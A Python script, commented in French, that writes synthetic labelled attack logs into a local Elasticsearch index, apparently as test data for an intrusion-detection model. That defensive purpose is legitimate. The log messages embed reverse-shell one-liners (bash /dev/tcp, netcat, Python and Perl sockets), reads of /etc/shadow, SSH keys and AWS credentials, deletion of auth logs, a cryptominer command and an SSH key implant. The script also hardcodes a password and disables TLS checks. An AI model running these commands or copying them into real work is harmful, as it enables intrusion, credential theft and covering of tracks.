# inject_attack_logs.py
"""
Génère des logs d'attaque réalistes couvrant les 9 types détectés
par le modèle. Chaque attaque a ground_truth=1.
"""

import json, ssl, urllib.request, base64, random
from datetime import datetime, timezone, timedelta
import numpy as np

ES_HOST  = "https://localhost:9200"
ES_USER  = "elastic"
ES_PASS  = "pfe2026"
ES_INDEX = "filebeat-logs-injected"

random.seed(99)

ATTACKER_IPS      = ["185.220.101.45", "45.33.32.156",
                      "103.21.244.0", "198.199.88.0"]
VICTIM_USERS      = ["root", "admin", "ubuntu", "test"]
NORMAL_HOSTS      = ["srv-web-01", "srv-db-01", "srv-app-02"]

def es_bulk(docs, ctx, headers):
    bulk = ""
    for doc in docs:
        bulk += json.dumps({"index": {"_index": ES_INDEX}}) + "\n"
        bulk += json.dumps(doc) + "\n"
    req = urllib.request.Request(
        f"{ES_HOST}/_bulk",
        data=bulk.encode(),
        headers=headers, method="POST")
    urllib.request.urlopen(req, context=ctx)

def make_es_client():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    token = base64.b64encode(f"{ES_USER}:{ES_PASS}".encode()).decode()
    return ctx, {"Content-Type": "application/json",
                 "Authorization": f"Basic {token}"}

def night_time():
    """Timestamp la nuit (1h-5h) un jour de semaine."""
    now = datetime.now(timezone.utc)
    while now.weekday() >= 5:
        now -= timedelta(days=1)
    return now.replace(
        hour=random.randint(1, 5),
        minute=random.randint(0, 59),
        second=random.randint(0, 59))

# ── 1. BRUTE FORCE SSH ──────────────────────────────────────────────────────

def gen_brute_force(n=50):
    logs = []
    ip   = random.choice(ATTACKER_IPS)
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()

    for i in range(n):
        user = random.choice(["root", "admin", "test", "ubuntu",
                               "user", "postgres", "mysql"])
        ts  += timedelta(seconds=random.randint(1, 10))
        logs.append({
            "@timestamp": ts.isoformat(),
            "message": f"Failed password for invalid user {user} from "
                       f"{ip} port {random.randint(40000,60000)} ssh2",
            "event":   {"dataset": "system.auth", "outcome": "failure"},
            "agent":   {"type": "filebeat"},
            "process": {"name": "sshd"},
            "user":    {"name": user},
            "source":  {"ip": ip},
            "host":    {"name": host},
            "ml": {
                "log_source":           "auth",
                "hour_of_day":          ts.hour,
                "is_off_hours":         1,
                "is_night":             1,
                "is_normal_candidate":  0,
                "normal_reject_reason": "attack_flag",
                "composite_score":      random.randint(8, 15),
                "auth_fail_count_5m":   i + 1,
                "auth_fail_ratio":      round(min(0.95, (i+1)/(i+2)), 3),
                "auth_ip_is_external":  1,
                "auth_is_brute_force":  1 if i >= 4 else 0,
                "auth_users_tried":     min(i + 1, 20),
                "auth_is_user_enum":    1 if i >= 2 else 0,
                "auth_is_stuffing":     1 if i >= 4 else 0,
                "ground_truth":         1,
                "attack_type":          "brute_force_ssh",
            }
        })
    return logs

# ── 2. REVERSE SHELL ────────────────────────────────────────────────────────

def gen_reverse_shell(n=30):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()
    attacker_ip = random.choice(ATTACKER_IPS)

    payloads = [
        "bash -i >& /dev/tcp/{ip}/4444 0>&1",
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{ip}\",1337))'",
        "nc {ip} 9001 -e /bin/bash",
        "perl -e 'use Socket;$i=\"{ip}\";$p=4444;"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 443 >/tmp/f",
    ]
    for i in range(n):
        ts   += timedelta(seconds=random.randint(5, 30))
        cmd   = random.choice(payloads).format(ip=attacker_ip)
        entropy = round(random.uniform(4.0, 5.2), 4)

        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    f"syscall=execve exe=/bin/bash args={cmd}",
            "event":      {"dataset": "auditd.log", "outcome": "success"},
            "agent":      {"type": "auditbeat"},
            "process":    {"executable": "/bin/bash", "args": cmd.split()},
            "user":       {"name": "www-data"},
            "host":       {"name": host},
            "auditd":     {"data": {"syscall": "execve", "key": "exec"}},
            "ml": {
                "log_source":            "auditd",
                "hour_of_day":           ts.hour,
                "is_off_hours":          1,
                "is_night":              1,
                "is_normal_candidate":   0,
                "normal_reject_reason":  "attack_flag",
                "composite_score":       random.randint(14, 22),
                "aud_reverse_shell":     1,
                "aud_cmd_entropy":       entropy,
                "aud_cmd_is_obfuscated": 1,
                "aud_cmd_length_log":    round(len(cmd) ** 0.5, 4),
                "aud_exfiltration":      1,
                "ground_truth":          1,
                "attack_type":           "reverse_shell",
            }
        })
    return logs

# ── 3. PRIVILEGE ESCALATION ─────────────────────────────────────────────────

def gen_privesc(n=20):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()

    for _ in range(n):
        ts += timedelta(seconds=random.randint(10, 60))
        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    "sudo: www-data : TTY=unknown ; PWD=/tmp ; "
                          "USER=root ; COMMAND=/bin/bash",
            "event":      {"dataset": "system.auth", "outcome": "success"},
            "agent":      {"type": "filebeat"},
            "process":    {"name": "sudo"},
            "user":       {"name": "www-data"},
            "host":       {"name": host},
            "ml": {
                "log_source":            "auth",
                "hour_of_day":           ts.hour,
                "is_off_hours":          1,
                "is_night":              1,
                "is_normal_candidate":   0,
                "normal_reject_reason":  "attack_flag",
                "composite_score":       random.randint(10, 18),
                "auth_sudo_to_root":     1,
                "cross_ssh_then_sudo":   1,
                "auth_is_root":          1,
                "ground_truth":          1,
                "attack_type":           "privilege_escalation",
            }
        })
    return logs

# ── 4. CREDENTIAL ACCESS ────────────────────────────────────────────────────

def gen_credential_access(n=20):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()
    targets = ["/etc/shadow", "/etc/passwd", "/.ssh/id_rsa",
               "/.aws/credentials", "/root/.bash_history"]

    for _ in range(n):
        ts     += timedelta(seconds=random.randint(5, 20))
        target  = random.choice(targets)
        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    f"syscall=open exe=/bin/cat args={target}",
            "event":      {"dataset": "auditd.log", "outcome": "success"},
            "agent":      {"type": "auditbeat"},
            "process":    {"executable": "/bin/cat", "args": [target]},
            "user":       {"name": "nobody"},
            "host":       {"name": host},
            "auditd":     {"data": {"syscall": "open", "key": "cred_access"}},
            "ml": {
                "log_source":            "auditd",
                "hour_of_day":           ts.hour,
                "is_off_hours":          1,
                "is_normal_candidate":   0,
                "normal_reject_reason":  "attack_flag",
                "composite_score":       random.randint(8, 14),
                "aud_credential_access": 1,
                "aud_severity":          random.randint(8, 14),
                "ground_truth":          1,
                "attack_type":           "credential_access",
            }
        })
    return logs

# ── 5. LOG TAMPERING ────────────────────────────────────────────────────────

def gen_log_tampering(n=15):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()

    for _ in range(n):
        ts  += timedelta(seconds=random.randint(5, 30))
        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    "syscall=unlink exe=/bin/rm args=/var/log/auth.log",
            "event":      {"dataset": "auditd.log", "outcome": "success"},
            "agent":      {"type": "auditbeat"},
            "process":    {"executable": "/bin/rm",
                           "args": ["/var/log/auth.log"]},
            "user":       {"name": "root"},
            "host":       {"name": host},
            "auditd":     {"data": {"syscall": "unlink",
                                    "key": "log_delete"}},
            "ml": {
                "log_source":           "auditd",
                "hour_of_day":          ts.hour,
                "is_off_hours":         1,
                "is_night":             1,
                "is_normal_candidate":  0,
                "normal_reject_reason": "attack_flag",
                "composite_score":      random.randint(10, 16),
                "aud_log_delete":       1,
                "aud_log_tamper":       1,
                "sys_log_tamper":       1,
                "is_root":              1,
                "ground_truth":         1,
                "attack_type":          "log_tampering",
            }
        })
    return logs

# ── 6. CRYPTOMINER ──────────────────────────────────────────────────────────

def gen_cryptominer(n=20):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()

    for _ in range(n):
        ts  += timedelta(seconds=random.randint(30, 120))
        pool = random.choice(["stratum+tcp://pool.minexmr.com:4444",
                               "stratum+tcp://xmrpool.eu:3333"])
        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    f"syscall=execve exe=/tmp/xmrig args={pool} -u wallet",
            "event":      {"dataset": "auditd.log", "outcome": "success"},
            "agent":      {"type": "auditbeat"},
            "process":    {"executable": "/tmp/xmrig",
                           "args": [pool, "-u", "wallet123"]},
            "user":       {"name": "nobody"},
            "host":       {"name": host},
            "auditd":     {"data": {"syscall": "execve", "key": "exec"}},
            "ml": {
                "log_source":            "auditd",
                "hour_of_day":           ts.hour,
                "is_normal_candidate":   0,
                "normal_reject_reason":  "attack_flag",
                "composite_score":       random.randint(6, 12),
                "aud_cryptominer":       1,
                "sys_high_cpu_process":  1,
                "aud_cmd_entropy":       round(random.uniform(3.8, 4.8), 4),
                "ground_truth":          1,
                "attack_type":           "cryptominer",
            }
        })
    return logs

# ── 7. SSH KEY IMPLANT ──────────────────────────────────────────────────────

def gen_ssh_key_implant(n=15):
    logs = []
    host = random.choice(NORMAL_HOSTS)
    ts   = night_time()

    for _ in range(n):
        ts += timedelta(seconds=random.randint(5, 20))
        logs.append({
            "@timestamp": ts.isoformat(),
            "message":    "syscall=write exe=/bin/bash "
                          "args=echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys",
            "event":      {"dataset": "auditd.log", "outcome": "success"},
            "agent":      {"type": "auditbeat"},
            "process":    {"executable": "/bin/bash",
                           "args": ["echo", "ssh-rsa AAAA...",
                                    ">>", "/root/.ssh/authorized_keys"]},
            "user":       {"name": "root"},
            "host":       {"name": host},
            "auditd":     {"data": {"syscall": "write",
                                    "key": "ssh_key"}},
            "ml": {
                "log_source":           "auditd",
                "hour_of_day":          ts.hour,
                "is_off_hours":         1,
                "is_normal_candidate":  0,
                "normal_reject_reason": "attack_flag",
                "composite_score":      random.randint(10, 16),
                "aud_ssh_key_implant":  1,
                "is_root":              1,
                "ground_truth":         1,
                "attack_type":          "ssh_key_implant",
            }
        })
    return logs

# ── MAIN ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    ctx, headers = make_es_client()

    print("Génération logs d'attaque...")
    all_attacks = (
        gen_brute_force(50)       +   # auth
        gen_reverse_shell(30)     +   # auditd
        gen_privesc(20)           +   # auth
        gen_credential_access(20) +   # auditd
        gen_log_tampering(15)     +   # auditd + syslog
        gen_cryptominer(20)       +   # auditd
        gen_ssh_key_implant(15)       # auditd
    )
    random.shuffle(all_attacks)

    batch_size = 100
    total = 0
    attack_types = {}

    for i in range(0, len(all_attacks), batch_size):
        batch = all_attacks[i:i+batch_size]
        es_bulk(batch, ctx, headers)
        total += len(batch)
        print(f"  {total}/{len(all_attacks)} injectés")

    # Résumé par type
    for log in all_attacks:
        t = log["ml"].get("attack_type", "unknown")
        attack_types[t] = attack_types.get(t, 0) + 1

    print(f"\nTerminé : {total} logs d'attaque dans {ES_INDEX}")
    print("\nDistribution par type :")
    for t, c in sorted(attack_types.items()):
        print(f"  {t:30s}: {c:3d} logs  ground_truth=1")